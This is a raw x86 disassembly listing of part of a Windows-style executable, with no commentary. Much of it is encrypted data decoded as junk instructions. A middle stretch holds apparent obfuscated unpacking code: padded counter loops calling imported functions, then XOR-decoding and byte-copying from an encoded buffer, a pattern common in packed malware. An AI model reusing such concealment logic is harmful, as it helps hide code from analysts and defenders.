  40f27b:	mov    BYTE PTR [eax-0x1254a536],dl
  40f281:	and    eax,0x903a5afa
  40f286:	cmp    esp,DWORD PTR [ebx]
  40f288:	mov    esi,DWORD PTR [ebx]
  40f28a:	pusha  
  40f28b:	push   0xffffffd6
  40f28d:	mov    ecx,0x307cf74d
  40f292:	inc    eax
  40f293:	test   DWORD PTR [ebp+eiz*4+0x316259dd],edi
  40f29a:	jle    0x40f241
  40f29c:	push   ss
  40f29d:	aad    0x94
  40f29f:	int3   
  40f2a0:	adc    BYTE PTR es:[edi+ebx*4],0xad
  40f2a5:	fcomi  st,st(1)
  40f2a7:	pop    edx
  40f2a8:	scas   eax,DWORD PTR es:[edi]
  40f2a9:	jns    0x40f2a3
  40f2ab:	sub    edi,DWORD PTR [edx]
  40f2ad:	pop    ecx
  40f2ae:	adc    eax,0x5dc77582
  40f2b3:	aas    
  40f2b4:	xchg   ebx,eax
  40f2b5:	ss pop ecx
  40f2b7:	ret    
  40f2b8:	xor    dh,BYTE PTR [ebx+0x1e11662f]
  40f2be:	mov    cl,0x46
  40f2c0:	aaa    
  40f2c1:	dec    edi
  40f2c2:	push   ebp
  40f2c3:	mov    ebp,0x8153d831
  40f2c8:	sbb    cl,BYTE PTR [ebx+0x45]
  40f2cb:	or     esi,DWORD PTR [eax+0x574829a6]
  40f2d1:	dec    edx
  40f2d2:	xchg   ebp,eax
  40f2d3:	fs jnp 0x40f2e9
  40f2d6:	ds mov ch,0x6
  40f2d9:	dec    edi
  40f2da:	dec    esp
  40f2db:	cmc    
  40f2dc:	test   eax,edi
  40f2de:	inc    edi
  40f2df:	mov    al,ds:0x6f2af73f
  40f2e4:	mov    ?,WORD PTR [ecx-0x2e]
  40f2e7:	add    DWORD PTR [eax],ebp
  40f2e9:	sbb    cl,BYTE PTR [esi+0x12c7101c]
  40f2ef:	mov    dl,0x31
  40f2f1:	dec    edi
  40f2f2:	loop   0x40f36d
  40f2f4:	or     al,0x2b
  40f2f6:	sbb    bh,BYTE PTR [ecx+0x8d117ee]
  40f2fc:	sbb    DWORD PTR [ebp+0x2e],0xc1b532c4
  40f303:	sub    BYTE PTR ds:[ecx-0x1793f9e4],bh
  40f30a:	test   eax,0xd0884e27
  40f30f:	xlat   BYTE PTR ds:[ebx]
  40f310:	mov    bl,0x20
  40f312:	mov    DWORD PTR [ebx],ebx
  40f314:	hlt    
  40f315:	sub    DWORD PTR [edx],edx
  40f317:	jmp    0x40f35c
  40f319:	ss push ebp
  40f31b:	enter  0xd70b,0x36
  40f31f:	cmp    al,0x55
  40f321:	call   0xed707e5a
  40f326:	mov    edx,ebx
  40f328:	jnp    0x40f38c
  40f32a:	xchg   DWORD PTR ds:0xdd08071a,eax
  40f330:	adc    eax,0x616d328f
  40f335:	test   DWORD PTR [ebp-0x31],edx
  40f338:	in     al,0x48
  40f33a:	xchg   ebx,eax
  40f33b:	xor    edx,ebp
  40f33d:	ret    
  40f33e:	mov    ebp,DWORD PTR [ebx+0x12]
  40f341:	sub    al,0xa2
  40f343:	sbb    eax,DWORD PTR [ecx+eax*8-0x767d63ee]
  40f34a:	and    BYTE PTR [ebp-0x338c8a3c],dl
  40f350:	or     al,0x7f
  40f352:	push   eax
  40f353:	(bad)  
  40f354:	adc    BYTE PTR [ebx+0x19c212ba],al
  40f35a:	aam    0x35
  40f35c:	ret    0x56b9
  40f35f:	push   ss
  40f360:	push   edi
  40f361:	xor    BYTE PTR [ebp+0x51fec40d],0xee
  40f368:	cdq    
  40f369:	pop    edx
  40f36a:	pop    eax
  40f36b:	shl    BYTE PTR [eax-0x2a],1
  40f36e:	and    esi,DWORD PTR [eax+0x41a6203c]
  40f374:	mov    al,ds:0x11beec4f
  40f379:	div    eax
  40f37b:	popa   
  40f37c:	shl    DWORD PTR [ebp-0x1e],0xd8
  40f380:	shr    BYTE PTR [ecx-0x637ace48],1
  40f386:	clc    
  40f387:	and    DWORD PTR ds:0x433827,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x433827
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433827,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433827,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433827,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433827
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433827,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433827,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43372b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433803
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433757,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433757,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433757,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433757
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433757,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4337ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4337ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4337ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4337ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4337ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4337ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4337db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4337db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4337db,edx
  40f498:	cmp    DWORD PTR ds:0x4337db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433991
  40f4af:	push   0x4339e7
  40f4b4:	push   0x4339cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4337db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433817
  40f4d2:	adc    DWORD PTR ds:0x433827,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x6c641c7]
  40f540:	(bad)  
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	sar    BYTE PTR [edx],0xd3
  40f54c:	into   
  40f54d:	in     eax,dx
  40f54e:	inc    ecx
  40f54f:	push   cs
  40f550:	js     0x40f554
  40f552:	push   ds
  40f553:	ins    BYTE PTR es:[edi],dx
  40f554:	jecxz  0x40f51f
  40f556:	xchg   edi,eax
  40f557:	movups xmm1,XMMWORD PTR [edx]
  40f55a:	neg    DWORD PTR [ecx+0x19]
  40f55d:	dec    edi
  40f55e:	xor    BYTE PTR [eax+0x298be61a],dl
  40f564:	mov    dh,0xd8
  40f566:	mov    esi,0xbea58f73
  40f56b:	pop    eax
  40f56c:	fisub  WORD PTR [ebx+ebx*4]
  40f56f:	and    dl,BYTE PTR [ecx]
  40f571:	xor    DWORD PTR [ecx],0xffffffe2
  40f574:	icebp  
  40f575:	(bad)  
  40f576:	inc    edx
  40f577:	cs rcr esp,cl
  40f57a:	mov    ch,0x4b
  40f57c:	xor    BYTE PTR [eax],dl
  40f57e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f57f:	add    al,0x15
  40f581:	or     bl,dl
  40f583:	jo     0x40f566
  40f585:	pop    esi
  40f586:	loopne 0x40f5cd
  40f588:	popa   
  40f589:	out    dx,al
  40f58a:	das    
  40f58b:	gs je  0x40f5e6
  40f58e:	push   ebx
  40f58f:	adc    DWORD PTR [ebx+0x78],ebp
  40f592:	jne    0x40f539
  40f594:	shl    BYTE PTR [ecx-0x5],1
  40f597:	push   esp
  40f598:	cmp    al,0x3a
  40f59a:	push   ebp
  40f59b:	inc    ebp
  40f59c:	lods   eax,DWORD PTR ds:[esi]
  40f59d:	inc    ebp
  40f59e:	out    dx,eax
  40f59f:	or     dh,ch
  40f5a1:	jle    0x40f58b
  40f5a3:	or     ebx,ecx
  40f5a5:	sub    esi,DWORD PTR [ebx+0x773dd4d5]
  40f5ab:	repnz sub eax,0x334a4f5f
  40f5b1:	sub    eax,edx
  40f5b3:	inc    esp
  40f5b4:	lods   al,BYTE PTR ds:[esi]
  40f5b5:	and    eax,0x43f831d8
  40f5ba:	xor    DWORD PTR [edi+ebx*4+0x62a4ee93],edx
  40f5c1:	mov    ebp,DWORD PTR [esi+0x38]
  40f5c4:	clc    
  40f5c5:	lahf   
  40f5c6:	repz mov WORD PTR [edi-0x6934aeac],?
  40f5cd:	mov    edx,ebx
  40f5cf:	sub    eax,0xbf278d48
  40f5d4:	lock sub al,0x2c
  40f5d7:	mov    edi,0xc74694ff
  40f5dc:	push   ds
  40f5dd:	jmp    0x2b9f:0xf129b1e
  40f5e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5e5:	pop    esp
  40f5e6:	out    0x93,al
  40f5e8:	and    al,0xb7
  40f5ea:	push   ebp
  40f5eb:	xchg   ebp,eax
  40f5ec:	loop   0x40f636
  40f5ee:	sub    eax,0x1366809f
  40f5f3:	adc    al,0x79
  40f5f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5f6:	popf   
  40f5f7:	and    al,0x92
  40f5f9:	cdq    
  40f5fa:	rol    dl,cl
  40f5fc:	stc    
  40f5fd:	jecxz  0x40f669
  40f5ff:	inc    eax
  40f600:	fistp  WORD PTR [eax+eax*4]
  40f603:	mov    BYTE PTR [esi-0x58d5cd19],dl
  40f609:	push   esp
  40f60a:	es xchg ebp,eax
  40f60c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f60d:	inc    edx
  40f60e:	lock jmp 0xc57c:0x5fafc0bd
  40f616:	test   BYTE PTR [esi+0x183252fc],ch
  40f61c:	pop    esi
  40f61d:	pop    ss
  40f61e:	dec    edx
  40f61f:	mov    cl,0x37
  40f621:	xchg   ecx,eax
  40f622:	gs jmp 0x60ac:0xef1a675c
  40f62a:	or     DWORD PTR [esi-0x13db0013],0x26d6e37a
  40f634:	retf   
  40f635:	jmp    0x40f5f1
  40f637:	mov    ebp,0xc65e6f73
  40f63c:	sbb    ebp,DWORD PTR [esi+edx*1-0x786eee99]
  40f643:	jl     0x40f5fb
  40f645:	dec    ebx
  40f646:	mov    eax,ds:0x2b50c792
  40f64b:	ficom  WORD PTR [ecx+0x64]
  40f64e:	inc    ebp
  40f64f:	cdq    
  40f650:	push   es
  40f651:	pushf  
  40f652:	loop   0x40f679
  40f654:	iret   
  40f655:	scas   al,BYTE PTR es:[di]
  40f657:	and    al,0xb1
  40f659:	iret   
  40f65a:	adc    BYTE PTR [ebp+0x40],bh
  40f65d:	push   ds
  40f65e:	xchg   BYTE PTR [ecx+edi*1],ah
  40f661:	dec    ebx
  40f662:	je     0x40f67c
  40f664:	ret    0xe71b
  40f667:	mov    cl,0x8d
  40f669:	(bad)  
  40f66a:	aam    0x5a
  40f66c:	jecxz  0x40f6c7
  40f66e:	mov    eax,ds:0x7803acb0
  40f673:	inc    ebp
  40f674:	or     BYTE PTR [ecx-0x37],cl
  40f677:	ins    BYTE PTR es:[edi],dx
  40f678:	call   0x5960c0ec
  40f67d:	in     al,dx
  40f67e:	hlt    
  40f67f:	adc    bl,cl
  40f681:	lods   al,BYTE PTR ds:[esi]
  40f682:	into   
  40f683:	clc    
  40f684:	test   DWORD PTR [ebx+ebp*2+0x12],0xc7eaca8b
  40f68c:	mov    bl,0xda
  40f68e:	pop    ebp
  40f68f:	stc    
  40f690:	cmp    DWORD PTR [ebx+0x66],edi
  40f693:	call   0x7312e8c2
  40f698:	imul   ebx,DWORD PTR ds:0x9a208503,0x357558e
  40f6a2:	(bad)  
  40f6a3:	iret   
  40f6a4:	xchg   edi,eax
  40f6a5:	cwde   
  40f6a6:	stos   BYTE PTR es:[edi],al
  40f6a7:	aad    0x39
  40f6a9:	push   0x35805a41
  40f6ae:	add    DWORD PTR [edx],eax
  40f6b0:	inc    esp
  40f6b1:	push   ds
  40f6b2:	pop    es
  40f6b3:	dec    edi
  40f6b4:	mov    ebx,0x11fbdf05
  40f6b9:	sub    eax,0xd4e553b7
  40f6be:	push   0x73
  40f6c0:	test   eax,0xe49fec86
  40f6c5:	pop    ss
  40f6c6:	pop    ebp
  40f6c7:	sbb    DWORD PTR [ebx-0x68],0xebcd781d
  40f6ce:	jl     0x40f671
  40f6d0:	dec    eax
  40f6d1:	cmc    
  40f6d2:	add    dh,BYTE PTR [edi+0x785944f4]
  40f6d8:	es out 0xe,al
  40f6db:	push   ebp
  40f6dc:	shl    DWORD PTR [eax-0x4],cl
  40f6df:	jmp    0xd17e:0x9f5eb2a0
  40f6e6:	xor    eax,0xdde0d3fe
  40f6eb:	jp     0x40f671
  40f6ed:	mov    ah,0x3c
  40f6ef:	xchg   edx,eax
  40f6f0:	dec    edi
  40f6f1:	add    BYTE PTR [ecx],ch
  40f6f3:	mov    ss,WORD PTR [ebp-0x1f]
  40f6f6:	gs mov bl,0x12
  40f6f9:	fwait
  40f6fa:	xlat   BYTE PTR ds:[ebx]
  40f6fb:	dec    edx
  40f6fc:	or     al,0x61
  40f6fe:	mov    dh,0x81
  40f700:	jmp    0xf00da2db
  40f705:	sub    ebp,ebx
  40f707:	imul   eax,DWORD PTR [eax+0x280a1cb2],0x161ccb6e
  40f711:	sbb    eax,0x15981731
  40f716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f717:	in     eax,0x56
  40f719:	mov    ebp,0xd1afbee4
  40f71e:	mov    cr4,esp
  40f721:	add    dl,0x6b
  40f724:	jo     0x40f748
  40f726:	push   0x2439d7dd
  40f72b:	leave  
  40f72c:	leave  
  40f72d:	adc    DWORD PTR [esi+esi*2+0x6339eff8],ebp
  40f734:	hlt    
  40f735:	data16 fdivr DWORD PTR ds:0x4500d9c2
  40f73c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f73d:	jb     0x40f77e
  40f73f:	sub    eax,0xcad6a3f2
  40f744:	cmp    BYTE PTR [eax],bl
  40f746:	inc    edi
  40f747:	cmp    edx,0xffffff8d
  40f74a:	xchg   esi,eax
  40f74b:	xchg   edi,eax
  40f74c:	loope  0x40f6f9
  40f74e:	push   edx
  40f74f:	pop    ebp
  40f750:	scas   eax,DWORD PTR es:[edi]
  40f751:	ret    
  40f752:	jecxz  0x40f74d
  40f754:	imul   edx,DWORD PTR [ebp+ebx*4+0x19546d11],0x22
  40f75c:	jo     0x40f7a5
  40f75e:	add    BYTE PTR [esi-0x38],cl
  40f761:	in     eax,dx
  40f762:	pusha  
  40f763:	(bad)  
  40f764:	push   ebx
  40f765:	ret    
  40f766:	ficomp DWORD PTR [ecx]
  40f768:	ins    DWORD PTR es:[edi],dx
  40f769:	mov    esp,0xc0dba912
  40f76e:	cld    
  40f76f:	pop    ecx
  40f770:	(bad)
  40f773:	jge    0x40f7e7
  40f775:	jo     0x40f7f6
  40f777:	jo     0x40f72f
  40f779:	arpl   WORD PTR [eax+0x5e],bx
  40f77c:	add    al,0x55
  40f77e:	sub    ebp,DWORD PTR ss:[ecx-0x6d]
  40f782:	add    DWORD PTR [ecx],ebx
  40f784:	sbb    al,BYTE PTR [esi-0x6a04332c]
  40f78a:	or     eax,0xb4c48d81
  40f78f:	dec    eax
  40f790:	je     0x40f80e
  40f792:	push   edi
  40f793:	into   
  40f794:	lods   al,BYTE PTR ds:[esi]
  40f795:	sbb    eax,0xdafab3c6
  40f79a:	inc    eax
  40f79b:	push   eax
  40f79c:	(bad)  
  40f79d:	cmp    DWORD PTR [edx],edx
  40f79f:	pop    esp
  40f7a0:	out    dx,eax
  40f7a1:	in     al,0x6f
  40f7a3:	xchg   ebp,eax
  40f7a4:	push   edx
  40f7a5:	int3   
  40f7a6:	adc    ecx,0xd44d5e00
  40f7ac:	pushf  
  40f7ad:	sbb    ch,BYTE PTR ds:0xe1ea3c66
  40f7b3:	xchg   edi,eax
  40f7b4:	mov    eax,DWORD PTR [eax-0x3d7c40d1]
  40f7ba:	cli    
  40f7bb:	mov    ebx,0x5d73bd0
  40f7c0:	dec    ebx
  40f7c1:	jbe    0x40f7fa
  40f7c3:	sbb    eax,0x17f3362e
  40f7c8:	popa   
  40f7c9:	jae    0x40f7eb
  40f7cb:	bound  edi,QWORD PTR [ecx+0x17]
  40f7ce:	xor    al,0xd3
  40f7d0:	dec    esp
  40f7d1:	inc    esp
  40f7d2:	add    BYTE PTR [edx+0x1c],bh
  40f7d5:	push   es
  40f7d6:	inc    edi
  40f7d7:	shl    DWORD PTR [edi],cl
  40f7d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7da:	mov    dh,0x28
  40f7dc:	xor    ebx,esp
  40f7de:	mov    ebx,ds
  40f7e0:	mov    ds:0xb500d3f3,eax
  40f7e5:	retf   
  40f7e6:	pop    ss
  40f7e7:	xor    DWORD PTR [esi+esi*4+0x352c85ff],ecx
  40f7ee:	mov    esp,0x768aa610
  40f7f3:	ds sub al,ah
  40f7f6:	nop
  40f7f7:	jb     0x40f7b0
  40f7f9:	jns    0x40f7cc
  40f7fb:	stos   DWORD PTR es:[edi],eax
  40f7fc:	(bad)
  40f7ff:	inc    edi
  40f800:	sub    ebx,DWORD PTR [ebx]
  40f802:	cmp    al,cl
  40f804:	and    dl,dl
  40f806:	cmp    BYTE PTR [ebp+0x4eca756],al
  40f80c:	cmp    ecx,esp
  40f80e:	aaa    
  40f80f:	adc    al,0xbe
  40f811:	imul   esi,ebx,0x88b3bfa
  40f817:	cmc    
  40f818:	fistp  DWORD PTR [ecx+0x767db9c7]
  40f81e:	or     al,0x69
  40f820:	sub    BYTE PTR [esi+ebx*2],dl
  40f823:	mov    edi,0x7fd7e7c5
  40f828:	jecxz  0x40f84a
  40f82a:	sbb    DWORD PTR [edi+0x2824f26b],edx
  40f830:	fisubr WORD PTR [edx+0x6e]
  40f833:	pop    ebx
  40f834:	dec    ecx
  40f835:	retf   
  40f836:	dec    ecx
  40f837:	sub    eax,0xf3be3836
  40f83c:	push   eax
  40f83d:	ds repz xchg ebp,eax
  40f840:	mov    dl,0x33
  40f842:	shl    DWORD PTR [edx+0x24],cl
  40f845:	in     eax,0x78
  40f847:	pop    es
  40f848:	gs dec esp
  40f84a:	arpl   WORD PTR [ebx],si
  40f84c:	stc    
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xf761e83f
  40f897:	dec    ebx
  40f898:	shr    BYTE PTR [ebx+0x7d7c7e7e],cl
  40f89e:	jle    0x40f91e
  40f8a0:	outs   dx,BYTE PTR ds:[esi]
  40f8a1:	xlat   BYTE PTR ds:[ebx]
  40f8a2:	lock ins BYTE PTR es:[edi],dx
  40f8a4:	push   ss
  40f8a5:	push   ds
  40f8a6:	or     dh,BYTE PTR [ecx+0x3d]
  40f8a9:	ds fs pop edi
  40f8ac:	pushf  
  40f8ad:	fisubr WORD PTR es:[esp+eiz*2]
  40f8b1:	sbb    al,0xa9
  40f8b3:	out    0x44,eax
  40f8b5:	out    dx,al
  40f8b6:	adc    edi,0x29
  40f8b9:	jnp    0x40f903
  40f8bb:	push   edi
  40f8bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8bd:	cmp    eax,0x39e155ef
  40f8c2:	push   esi
  40f8c3:	std    
  40f8c4:	pand   mm1,QWORD PTR [ecx+0x4ec61f05]
  40f8cb:	daa    
  40f8cc:	sub    edx,ebp
  40f8ce:	jp     0x40f8be
  40f8d0:	jne    0x40f88b
  40f8d2:	push   0x538018dd
  40f8d7:	stos   BYTE PTR es:[edi],al
  40f8d8:	push   ecx
  40f8d9:	mov    dl,0xa2
  40f8db:	mov    bl,BYTE PTR [esp+eiz*8]
  40f8de:	(bad)  
  40f8df:	push   es
  40f8e0:	cmp    BYTE PTR [eax-0x4e],bh
  40f8e3:	xchg   ebp,eax
  40f8e4:	push   ds
  40f8e5:	into   
  40f8e6:	mov    edi,DWORD PTR [edi+eax*2+0x36]
  40f8ea:	stc    
  40f8eb:	ja     0x40f91b
  40f8ed:	xchg   BYTE PTR [ebx],ch
  40f8ef:	add    edx,edx
  40f8f1:	arpl   WORD PTR [esi-0x47],sp
  40f8f4:	push   cs
  40f8f5:	fcmovnbe st,st(3)
  40f8f7:	aaa    
  40f8f8:	or     ecx,DWORD PTR [ecx]
  40f8fa:	clc    
  40f8fb:	mov    cl,0x69
  40f8fd:	(bad)  
  40f8fe:	mov    edx,0xa8ba4103
  40f903:	jl     0x40f906
  40f905:	popf   
  40f906:	(bad)  
  40f907:	lahf   
  40f908:	fstp   DWORD PTR [esi+eax*4+0x4e]
  40f90c:	xchg   ecx,eax
  40f90d:	inc    edi
  40f90e:	js     0x40f8fd
  40f910:	ret    0x5f22
  40f913:	and    eax,0x360e58bb
  40f918:	into   
  40f919:	ds div cl
  40f91c:	(bad)  
  40f91e:	(bad)  
  40f91f:	pop    eax
  40f920:	sub    eax,0x71db9b7c
  40f925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f926:	jb     0x40f970
  40f928:	fs jmp 0x6c23817
  40f92e:	scas   al,BYTE PTR es:[edi]
  40f92f:	leave  
  40f930:	mov    bh,0x3c
  40f932:	call   FWORD PTR [edx-0x8]
  40f935:	jge    0x40f97d
  40f937:	je     0x40f91e
  40f939:	js     0x40f995
  40f93b:	add    bl,BYTE PTR [ecx-0x17c73d0f]
  40f941:	icebp  
  40f942:	je     0x40f933
  40f944:	or     BYTE PTR [ecx+ecx*8-0x323e6014],cl
  40f94b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f94c:	(bad)
  40f94f:	mov    esp,0xdc4416e4
  40f954:	jecxz  0x40f9a4
  40f956:	xchg   ebp,eax
  40f957:	pusha  
  40f958:	dec    ebx
  40f959:	xchg   DWORD PTR ds:0xb7383abd,edx
  40f95f:	adc    ah,BYTE PTR [ebp+0x6167aae8]
  40f965:	sti    
  40f966:	xchg   dh,cl
  40f968:	jno    0x40f98a
  40f96a:	mov    al,0xbe
  40f96c:	xchg   edi,eax
  40f96d:	in     eax,dx
  40f96e:	pop    esi
  40f96f:	idiv   dh
  40f971:	fcom   QWORD PTR [ebx+0x776e612]
  40f977:	xchg   ebp,eax
  40f978:	mov    dh,0x4e
  40f97a:	mov    DWORD PTR [ebp+0x5c],ebp
  40f97d:	mov    ah,0x10
  40f97f:	cmp    ebp,ecx
  40f981:	mov    eax,0x99d180d0
  40f986:	add    ecx,DWORD PTR [ecx-0x52]
  40f989:	sub    BYTE PTR [edi],0xd
  40f98c:	imul   edi,esi,0x99308ba5
  40f992:	adc    esi,0xffffff8a
  40f995:	shl    DWORD PTR [ebx],0x2
  40f998:	pop    DWORD PTR [ebp+0x6b9b5e75]
  40f99e:	add    al,0x6d
  40f9a0:	pop    ss
  40f9a1:	or     eax,DWORD PTR [esi]
  40f9a3:	dec    ebx
  40f9a4:	sbb    BYTE PTR [eax+0xb8eb754],dl
  40f9aa:	popa   
  40f9ab:	inc    esi
  40f9ac:	(bad)  
  40f9ad:	fdivr  st(6),st
  40f9af:	inc    ebp
  40f9b0:	popf   
  40f9b1:	xchg   BYTE PTR [ecx],dh
  40f9b3:	xchg   ecx,ebp
  40f9b5:	pop    esi
  40f9b6:	mov    al,0x61
  40f9b8:	js     0x40f98d
  40f9ba:	(bad)  
  40f9bb:	adc    al,0xf
  40f9bd:	lock jns 0x40fa09
  40f9c0:	adc    eax,0xc0c9869b
  40f9c5:	in     eax,0xbf
  40f9c7:	push   ds
  40f9c8:	clc    
  40f9c9:	jbe    0x40fa30
  40f9cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9cc:	inc    ebp
  40f9cd:	sbb    eax,0x670dfcab
  40f9d2:	aad    0x63
  40f9d4:	mov    cl,0x37
  40f9d6:	pop    esi
  40f9d7:	mul    DWORD PTR [edx+esi*4-0x7f5932f9]
  40f9de:	retf   0x4844
  40f9e1:	ss daa 
  40f9e3:	mov    eax,ds:0xd911d517
  40f9e8:	loopne 0x40f9d0
  40f9ea:	push   ds
  40f9eb:	out    dx,al
  40f9ec:	mov    si,0xff2b
  40f9f0:	inc    edx
  40f9f1:	pop    es
  40f9f2:	mov    bl,ch
  40f9f4:	push   edi
  40f9f5:	jecxz  0x40f9f0
  40f9f7:	mov    edx,0x62562430
  40f9fc:	jecxz  0x40f988
  40f9fe:	idiv   BYTE PTR [edx-0x6273d96a]
  40fa04:	out    dx,eax
  40fa05:	sub    eax,0xcf64a739
  40fa0a:	int    0x9b
  40fa0c:	and    al,0xd
  40fa0e:	loope  0x40f9b1
  40fa10:	sahf   
  40fa11:	xor    DWORD PTR [ebx],0x334bd488
  40fa17:	adc    al,0x63
  40fa19:	mov    ebp,0xc9e1d626
  40fa1e:	(bad)  
  40fa1f:	cmc    
  40fa20:	retf   
  40fa21:	test   DWORD PTR [edx+eax*1-0xc],0x575dc0b4
  40fa29:	mov    ebp,0xe4522c5d
  40fa2e:	sbb    al,BYTE PTR [ecx-0x11]
  40fa31:	sar    DWORD PTR [edi+edx*2-0x18],0xdb
  40fa36:	call   0xd083bce0
  40fa3b:	dec    edi
  40fa3c:	pop    edx
  40fa3d:	mov    DWORD PTR [ebp-0x215dff6e],esp
  40fa43:	pop    es
  40fa44:	sub    eax,0x9fd63d0
  40fa49:	fbstp  TBYTE PTR [edx]
  40fa4b:	je     0x40f9f5
  40fa4d:	push   esp
  40fa4e:	test   al,0xa5
  40fa50:	cmp    eax,0xdda4c09f
  40fa55:	sbb    esi,DWORD PTR [edi]
  40fa57:	or     DWORD PTR [edx],esi
  40fa59:	loop   0x40fa68
  40fa5b:	sbb    eax,0x7adfb9e8
  40fa60:	lahf   
  40fa61:	mov    bl,BYTE PTR cs:[edi+0x6e]
  40fa65:	sbb    BYTE PTR [ebx],0x7e
  40fa68:	ffreep st(6)
  40fa6a:	cld    
  40fa6b:	sti    
  40fa6c:	test   DWORD PTR cs:[edi+0x76],0xe89aca13
  40fa74:	imul   edi,DWORD PTR [edx-0x18],0xfcf1ac09
  40fa7b:	or     ecx,edi
  40fa7d:	shl    ah,0x93
  40fa80:	mov    al,0x81
  40fa82:	push   ss
  40fa83:	add    BYTE PTR [ecx-0x68],dh
  40fa86:	ss and eax,0x4514263e
  40fa8c:	mov    BYTE PTR [ecx],dh
  40fa8e:	fild   DWORD PTR [edx-0x2579b2a5]
  40fa94:	and    al,0x44
  40fa96:	add    al,0x66
  40fa98:	nop
  40fa99:	xchg   dl,dl
  40fa9b:	and    al,0xe9
  40fa9d:	push   cs
  40fa9e:	outs   dx,BYTE PTR ds:[esi]
